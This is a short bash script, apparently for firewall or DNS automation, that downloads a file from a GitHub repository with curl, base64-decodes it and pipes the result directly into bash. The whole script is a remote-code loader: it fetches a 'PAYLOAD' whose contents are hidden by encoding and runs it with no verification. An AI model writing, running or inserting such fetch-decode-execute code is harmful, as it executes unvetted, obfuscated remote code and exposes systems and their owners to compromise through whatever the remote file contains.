#!/bin/bash
PAYLOAD=$(curl -s "https://github.com/raviteja-panugundla/pcai-automation/blob/main/firewall-pcai-dns.txt?raw=1")

if [[ -z "$PAYLOAD" ]]; then
    echo "Failed to download payload from github.com"
    exit 1
fi

echo "$PAYLOAD" | base64 -d | bash

